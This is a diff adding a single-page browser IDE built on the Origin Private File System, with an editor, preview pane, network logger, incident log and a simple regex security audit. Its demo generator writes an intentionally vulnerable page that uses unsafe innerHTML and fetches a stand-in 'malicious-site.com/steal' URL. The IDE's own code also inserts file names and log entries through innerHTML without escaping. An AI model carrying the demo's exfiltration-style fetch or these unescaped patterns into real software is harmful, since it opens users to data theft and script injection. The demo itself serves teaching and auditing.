@@ -1,0 +1,375 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>IDE v8.4: OPFS Powered Security Suite</title>
+    <style>
+        :root {
+            --primary: #1877f2; --border: #ddd; --header-bg: #1877f2; --header-text: #fff;
+            --sidebar-bg: #fff; --sidebar-text: #333; --editor-bg: #282c34; --editor-text: #abb2bf;
+            --line-num-bg: #21252b; --line-num-text: #636d83; --success: #42b72a; --danger: #f48771; --warn: #eab308;
+        }
+        body.midnight { --editor-bg: #000; --sidebar-bg: #111; --sidebar-text: #0f0; --border: #333; --header-bg: #000; --header-text: #0f0; --line-num-bg: #000; --line-num-text: #0f0; }
+        body.light { --editor-bg: #fff; --editor-text: #222; --sidebar-bg: #f8f9fa; --border: #ccc; --line-num-bg: #f0f0f0; --line-num-text: #999; }
+
+        body { font-family: system-ui, sans-serif; margin: 0; background: #f0f2f5; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
+        header { background: var(--header-bg); color: var(--header-text); padding: 0 20px; display: flex; justify-content: space-between; align-items: center; height: 45px; flex-shrink: 0; }
+        
+        .controls { padding: 8px 15px; background: #fff; border-bottom: 1px solid var(--border); display: flex; gap: 8px; align-items: center; flex-shrink: 0; flex-wrap: wrap; }
+        .main-layout { display: flex; flex: 1; overflow: hidden; }
+        
+        .sidebar { width: 350px; background: var(--sidebar-bg); border-right: 1px solid var(--border); display: flex; flex-direction: column; }
+        .tab-row { display: flex; background: rgba(0,0,0,0.05); border-bottom: 1px solid var(--border); }
+        .tab { flex: 1; padding: 10px 5px; text-align: center; cursor: pointer; font-size: 9px; font-weight: bold; color: #666; transition: 0.2s; }
+        .tab.active { background: var(--sidebar-bg); color: var(--primary); border-bottom: 2px solid var(--primary); }
+        .pane { display: none; flex: 1; flex-direction: column; padding: 12px; overflow-y: auto; }
+        .pane.active { display: flex; }
+
+        /* DB Styles */
+        .db-entry { background: rgba(0,0,0,0.03); border: 1px solid var(--border); border-radius: 4px; padding: 8px; margin-bottom: 8px; }
+        .db-title { font-weight: bold; font-size: 12px; color: var(--primary); margin-bottom: 4px; }
+        .db-desc { font-size: 11px; margin-bottom: 4px; color: #555; }
+        .db-mitigation { font-size: 10px; color: var(--success); font-family: monospace; background: rgba(66, 183, 42, 0.1); padding: 4px; border-radius: 4px; }
+        .db-input { width: 100%; padding: 6px; margin-bottom: 6px; border: 1px solid #ddd; border-radius: 4px; font-size: 11px; box-sizing: border-box; }
+
+        /* Tree UI */
+        .tree-root-node { font-weight: bold; color: var(--primary); margin-bottom: 5px; font-size: 11px; padding: 0 8px; }
+        .tree-item { margin-left: 15px; border-left: 1px solid rgba(0,0,0,0.05); }
+        .tree-row { display: flex; align-items: center; padding: 5px 8px; border-radius: 4px; cursor: pointer; font-size: 13px; }
+        .tree-row:hover { background: rgba(0,0,0,0.05); }
+        .tree-row.active { background: #e7f3ff; color: var(--primary); font-weight: 600; }
+        
+        /* Editor */
+        .workspace { flex: 1; display: grid; grid-template-rows: 1fr 140px; background: #ccc; }
+        .panes { display: grid; grid-template-columns: 1fr 1fr; gap: 1px; height: 100%; }
+        .editor-container { position: relative; background: var(--editor-bg); display: flex; overflow: hidden; }
+        #line-numbers { width: 40px; background: var(--line-num-bg); color: var(--line-num-text); padding: 15px 5px; text-align: right; font-family: monospace; font-size: 13px; line-height: 1.6; user-select: none; }
+        .editor-stack { flex: 1; position: relative; overflow: hidden; }
+        #editor, #highlighting { margin: 0; padding: 15px; border: 0; width: 100%; height: 100%; font-family: 'Fira Code', monospace; font-size: 13px; line-height: 1.6; white-space: pre; position: absolute; top: 0; left: 0; box-sizing: border-box; overflow: auto; outline: none; }
+        #editor { color: transparent; background: transparent; caret-color: #fff; z-index: 2; resize: none; }
+        #highlighting { color: var(--editor-text); z-index: 1; pointer-events: none; }
+        
+        #console-container { display: flex; flex-direction: column; background: #1e1e1e; border-top: 2px solid #333; }
+        .c-toolbar { background: #252526; padding: 5px 15px; display: flex; justify-content: space-between; align-items: center; color: #888; font-size: 10px; font-weight: bold; }
+        #console { flex: 1; color: #d4d4d4; padding: 10px; font-family: monospace; font-size: 11px; overflow-y: auto; }
+        
+        button { padding: 6px 12px; border-radius: 4px; border: none; cursor: pointer; font-weight: 600; font-size: 11px; background: #e4e6eb; margin-top:4px; }
+        .btn-blue { background: var(--primary); color: white; }
+        .btn-run { background: var(--success); color: white; }
+        .btn-demo { background: #9c27b0; color: white; }
+        .btn-red { background: var(--danger); color: white; }
+        .t-tag { color: #e06c75; } .t-attr { color: #d19a66; } .t-str { color: #98c379; } .t-key { color: #c678dd; }
+    </style>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
+</head>
+<body>
+
+<header>
+    <div>Local IDE v8.4 (OPFS)</div>
+    <div id="file-label" style="font-size: 11px; opacity: 0.7;">System Ready</div>
+</header>
+
+<div class="controls">
+    <button class="btn-blue" id="mountBtn">Initialize / Load OPFS</button>
+    <button class="btn-red" id="wipeBtn" disabled>Wipe Storage</button>
+    <div style="width:1px; height:20px; background:#ddd; margin:0 5px;"></div>
+    <button class="btn-demo" id="demoBtn" disabled>⚡ Load Demo</button>
+    <button class="btn-run" id="runBtn" disabled>▶ Run</button>
+    <button id="auditBtn" disabled>🛡️ Audit</button>
+    <button id="saveBtn" disabled>Save</button>
+    <button id="newFileBtn" disabled>+ File</button>
+    <button id="newFolderBtn" disabled>+ Folder</button>
+    <button id="backupBtn" disabled>💾 Backup .zip</button>
+</div>
+
+<div class="main-layout">
+    <div class="sidebar">
+        <div class="tab-row">
+            <div class="tab active" onclick="switchTab('explorer')">FILES</div>
+            <div class="tab" onclick="switchTab('db')">DB</div>
+            <div class="tab" onclick="switchTab('network')">NET</div>
+            <div class="tab" onclick="switchTab('tools')">TOOLS</div>
+        </div>
+        
+        <div id="explorerPane" class="pane active">
+            <div id="tree-root-header" class="tree-root-node"></div>
+            <div id="tree-root"></div>
+        </div>
+
+        <div id="dbPane" class="pane">
+            <div style="font-weight:bold; font-size:11px; margin-bottom:10px;">ADD NEW INCIDENT</div>
+            <input type="text" id="dbTitle" class="db-input" placeholder="Title (e.g., XSS Found)">
+            <input type="text" id="dbDesc" class="db-input" placeholder="Description...">
+            <input type="text" id="dbMit" class="db-input" placeholder="Mitigation (e.g., Use .textContent)">
+            <button class="btn-blue" id="addDbEntryBtn" style="width:100%; margin-bottom:15px;">Save Entry</button>
+            <div id="dbList">Load project to view.</div>
+        </div>
+
+        <div id="networkPane" class="pane">
+            <div style="font-size: 10px; color: #888; margin-bottom: 10px; display: flex; justify-content: space-between;">
+                TRAFFIC LOG <span onclick="document.getElementById('netList').innerHTML=''" style="cursor:pointer; color:var(--primary);">CLEAR</span>
+            </div>
+            <div id="netList"></div>
+        </div>
+
+        <div id="toolsPane" class="pane">
+            <div style="font-weight:bold; font-size:11px; margin-bottom:10px;">GLOBAL REPLACE</div>
+            <input type="text" id="gFind" class="db-input" placeholder="Find text...">
+            <input type="text" id="gReplace" class="db-input" placeholder="Replace with...">
+            <button class="btn-blue" id="gReplaceBtn" style="width:100%;">Run Replace</button>
+            <hr style="margin:20px 0; border:0; border-top:1px solid #eee;">
+            <button onclick="setTheme('')" style="width:100%; margin-bottom:5px;">One Dark</button>
+            <button onclick="setTheme('midnight')" style="width:100%; background:#000; color:#0f0;">Midnight</button>
+        </div>
+    </div>
+
+    <div class="workspace">
+        <div class="panes">
+            <div class="editor-container">
+                <div id="line-numbers">1</div>
+                <div class="editor-stack">
+                    <pre id="highlighting"><code id="h-content"></code></pre>
+                    <textarea id="editor" spellcheck="false" placeholder="Initialize OPFS to start."></textarea>
+                </div>
+            </div>
+            <iframe id="preview" style="width:100%; height:100%; border:none; background:white;"></iframe>
+        </div>
+        <div id="console-container">
+            <div class="c-toolbar">
+                CONSOLE & AUDIT LOGS
+                <span id="mitigateBtn" style="color:var(--warn); cursor:pointer; display:none;" onclick="applyMitigation()">[ FIX VULNERABILITIES ]</span>
+            </div>
+            <div id="console">> IDE Ready (OPFS Mode). Click 'Initialize' to access private storage.</div>
+        </div>
+    </div>
+</div>
+
+<script>
+    let rootHandle, currentFileHandle;
+    const editor = document.getElementById('editor');
+    const hContent = document.getElementById('h-content');
+    const consoleEl = document.getElementById('console');
+    const lineNumbers = document.getElementById('line-numbers');
+
+    function log(msg, color = null) {
+        const d = document.createElement('div');
+        if(color) d.style.color = color;
+        d.textContent = `> ${msg}`;
+        consoleEl.appendChild(d); consoleEl.scrollTop = consoleEl.scrollHeight;
+    }
+    function switchTab(t) {
+        document.querySelectorAll('.tab, .pane').forEach(el => el.classList.remove('active'));
+        document.querySelector(`.tab[onclick="switchTab('${t}')"]`).classList.add('active');
+        document.getElementById(`${t}Pane`).classList.add('active');
+    }
+    function setTheme(t) { document.body.className = t; }
+
+    // --- OPFS INITIALIZATION ---
+    document.getElementById('mountBtn').onclick = async () => {
+        try {
+            rootHandle = await navigator.storage.getDirectory();
+            document.getElementById('tree-root-header').textContent = `📁 OPFS://ROOT`;
+            await buildTree(rootHandle, document.getElementById('tree-root'));
+            enableControls();
+            loadDB();
+            log("Origin Private File System (OPFS) mounted.", "var(--success)");
+        } catch(e) { log("OPFS Error: " + e.message, "var(--danger)"); }
+    };
+
+    document.getElementById('wipeBtn').onclick = async () => {
+        if(!confirm("WIPE ALL DATA? This will permanently delete the entire OPFS workspace.")) return;
+        // OPFS doesn't have a clear() method on root, so we iterate and remove
+        for await (const entry of rootHandle.values()) {
+            await rootHandle.removeEntry(entry.name, {recursive: true});
+        }
+        await buildTree(rootHandle, document.getElementById('tree-root'));
+        log("Workspace wiped.", "var(--danger)");
+    };
+
+    function enableControls() {
+        const ids = ['newFileBtn', 'newFolderBtn', 'backupBtn', 'demoBtn', 'auditBtn', 'wipeBtn'];
+        ids.forEach(id => document.getElementById(id).disabled = false);
+    }
+
+    // --- DEMO GENERATOR (OPFS) ---
+    document.getElementById('demoBtn').onclick = async () => {
+        const name = "vulnerable_demo.html";
+        const content = `<!DOCTYPE html>
+<html>
+<head><title>XSS Demo</title></head>
+<body>
+    <h1>Security Test Page</h1>
+    <div id="output"></div>
+    <script>
+        // VULNERABILITY: Unsafe innerHTML
+        const userUrl = "http://malicious-site.com/steal?data=123";
+        document.getElementById('output').innerHTML = "User visited: " + userUrl;
+        
+        // VULNERABILITY: Insecure fetch
+        fetch(userUrl); 
+    <\/script>
+</body>
+</html>`;
+        try {
+            const h = await rootHandle.getFileHandle(name, {create: true});
+            const w = await h.createWritable();
+            await w.write(content); await w.close();
+            log(`Created ${name}. Click 'Audit' to scan it.`, "var(--success)");
+            await buildTree(rootHandle, document.getElementById('tree-root'));
+        } catch(e) { log("Error creating demo: " + e.message, "var(--danger)"); }
+    };
+
+    // --- VULNERABILITY DATABASE ---
+    async function loadDB() {
+        const list = document.getElementById('dbList');
+        try {
+            const handle = await rootHandle.getFileHandle('vulnerabilities.json', {create: true});
+            const text = await (await handle.getFile()).text();
+            const data = text ? JSON.parse(text) : [];
+            list.innerHTML = "";
+            data.forEach(entry => {
+                list.innerHTML += `<div class="db-entry"><div class="db-title">${entry.title}</div><div class="db-desc">${entry.desc}</div><div class="db-mitigation">FIX: ${entry.mit}</div></div>`;
+            });
+            if(data.length===0) list.innerHTML = "No entries.";
+        } catch(e) { list.innerHTML = "DB Error or Empty."; }
+    }
+
+    document.getElementById('addDbEntryBtn').onclick = async () => {
+        const title = document.getElementById('dbTitle').value;
+        const desc = document.getElementById('dbDesc').value;
+        const mit = document.getElementById('dbMit').value;
+        if(!title) return;
+        try {
+            const handle = await rootHandle.getFileHandle('vulnerabilities.json', {create: true});
+            const text = await (await handle.getFile()).text();
+            const data = text ? JSON.parse(text) : [];
+            data.push({title, desc, mit, date: new Date().toISOString()});
+            const w = await handle.createWritable(); await w.write(JSON.stringify(data, null, 2)); await w.close();
+            document.getElementById('dbTitle').value = "";
+            loadDB();
+            log("Vulnerability logged.");
+        } catch(e) { log("Save failed.", "var(--danger)"); }
+    };
+
+    // --- AUDIT & MITIGATION ---
+    let auditFindings = [];
+    document.getElementById('auditBtn').onclick = async () => {
+        log("Scanning...", "var(--warn)");
+        auditFindings = [];
+        const patterns = [
+            { n: "XSS Risk", r: /\.innerHTML\s*=/, m: "Use .textContent" },
+            { n: "Insecure Fetch", r: /http:\/\//, m: "Use HTTPS" }
+        ];
+        async function scan(h) {
+            for await (const e of h.values()) {
+                if(e.kind==='directory') await scan(e);
+                else {
+                    const t = await (await e.getFile()).text();
+                    patterns.forEach(p => { if(p.r.test(t)) { auditFindings.push(p); log(`[!] ${p.n} in ${e.name}`, "var(--warn)"); } });
+                }
+            }
+        }
+        await scan(rootHandle);
+        if(auditFindings.length > 0) document.getElementById('mitigateBtn').style.display = 'inline';
+        else log("No issues found.", "var(--success)");
+    };
+
+    function applyMitigation() {
+        let t = editor.value;
+        t = t.replace(/\.innerHTML\s*=/g, ".textContent =");
+        t = t.replace(/http:\/\//g, "https://");
+        editor.value = t;
+        hContent.innerHTML = applyHighlight(t) + "\n";
+        log("Patches applied. Please Save.", "var(--success)");
+    }
+
+    // --- CORE FILE SYSTEM ---
+    function sanitize(text) { return text.replace(/<span class="t-[a-z]+">/gi, "").replace(/<\/span>/gi, "").replace(/##[A-Z_]+##/g, ""); }
+    function applyHighlight(text) {
+        let code = text.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
+        code = code.replace(/(&lt;\/?[a-z1-6!]+)/gi, '##T_S##$1##T_E##');
+        code = code.replace(/(\s)([a-z-]+)(?==)/gi, '$1##A_S##$2##A_E##');
+        code = code.replace(/"(.*?)"/g, '##S_S##"$1"##S_E##');
+        code = code.replace(/\b(let|const|var|function|return|if|else|class|async|await)\b/g, '##K_S##$1##K_E##');
+        return code.replace(/##T_S##/g, '<span class="t-tag">').replace(/##T_E##/g, '</span>')
+                   .replace(/##A_S##/g, '<span class="t-attr">').replace(/##A_E##/g, '</span>')
+                   .replace(/##S_S##/g, '<span class="t-str">').replace(/##S_E##/g, '</span>')
+                   .replace(/##K_S##/g, '<span class="t-key">').replace(/##K_E##/g, '</span>');
+    }
+
+    async function buildTree(handle, container) {
+        container.innerHTML = "";
+        const entries = []; for await (const e of handle.values()) entries.push(e);
+        entries.sort((a,b) => (b.kind==='directory') - (a.kind==='directory') || a.name.localeCompare(b.name));
+        for (const entry of entries) {
+            const row = document.createElement('div');
+            row.className = `tree-row ${currentFileHandle?.name === entry.name ? 'active' : ''}`;
+            row.innerHTML = `<span>${entry.kind==='directory'?'📁':'📄'} ${entry.name}</span>`;
+            if (entry.kind === 'directory') {
+                const sub = document.createElement('div'); sub.className = 'tree-item'; sub.style.display = 'none';
+                row.onclick = () => sub.style.display = sub.style.display === 'none' ? 'block' : 'none';
+                container.appendChild(row); container.appendChild(sub);
+                await buildTree(entry, sub);
+            } else {
+                row.onclick = () => loadFile(entry); container.appendChild(row);
+            }
+        }
+    }
+
+    async function loadFile(h) {
+        currentFileHandle = h;
+        editor.value = sanitize(await (await h.getFile()).text());
+        hContent.innerHTML = applyHighlight(editor.value) + "\n";
+        document.getElementById('saveBtn').disabled = document.getElementById('runBtn').disabled = false;
+        document.getElementById('file-label').textContent = `Active: ${h.name}`;
+        lineNumbers.innerHTML = Array.from({length: editor.value.split('\n').length}, (_, i) => i + 1).join('<br>');
+    }
+
+    document.getElementById('runBtn').onclick = () => {
+        const hook = `<script>(function(){const netLog=(d)=>window.parent.postMessage({type:'network',...d},'*');const originalFetch=window.fetch;window.fetch=async(...args)=>{const u=args[0]instanceof Request?args[0].url:args[0];const m=(args[1]&&args[1].method)||'GET';try{const r=await originalFetch.apply(this,args);netLog({url:u,method:m,status:r.status});return r}catch(e){netLog({url:u,method:m,status:'BLOCKED'});throw e}}})();<\/script>`;
+        const blob = new Blob([`<html><body>${hook}${sanitize(editor.value)}</body></html>`], {type: 'text/html'});
+        document.getElementById('preview').src = URL.createObjectURL(blob);
+    };
+
+    window.addEventListener('message', (e) => {
+        if (e.data.type === 'network') {
+            const list = document.getElementById('netList');
+            const item = document.createElement('div');
+            item.className = 'tree-row';
+            item.innerHTML = `<b>[${e.data.method}]</b> ${e.data.url.substring(0,25)}... (${e.data.status})`;
+            list.prepend(item);
+        }
+    });
+
+    document.getElementById('saveBtn').onclick = async () => {
+        const w = await currentFileHandle.createWritable();
+        await w.write(editor.value); await w.close(); log("Saved.");
+    };
+    
+    // --- BACKUP (.ZIP) ---
+    document.getElementById('backupBtn').onclick = async () => {
+        const zip = new JSZip();
+        async function walk(h, folder) {
+            for await (const e of h.values()) {
+                if(e.kind==='directory') await walk(e, folder.folder(e.name));
+                else folder.file(e.name, await e.getFile());
+            }
+        }
+        await walk(rootHandle, zip);
+        const blob = await zip.generateAsync({type: "blob"});
+        const a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = `opfs_project_backup.zip`; a.click();
+        log("Project exported as ZIP.");
+    };
+    
+    document.getElementById('newFileBtn').onclick = async () => {
+        const n = prompt("File name:"); if(n) { await rootHandle.getFileHandle(n, {create:true}); await buildTree(rootHandle, document.getElementById('tree-root')); }
+    };
+    document.getElementById('newFolderBtn').onclick = async () => {
+        const n = prompt("Folder name:"); if(n) { await rootHandle.getDirectoryHandle(n, {create:true}); await buildTree(rootHandle, document.getElementById('tree-root')); }
+    };
+    
+    editor.oninput = () => { hContent.innerHTML = applyHighlight(editor.value) + "\n"; };
+    editor.onscroll = () => { lineNumbers.scrollTop = editor.scrollTop; document.getElementById('highlighting').scrollTop = editor.scrollTop; };
+</script>
+</body>
+</html>
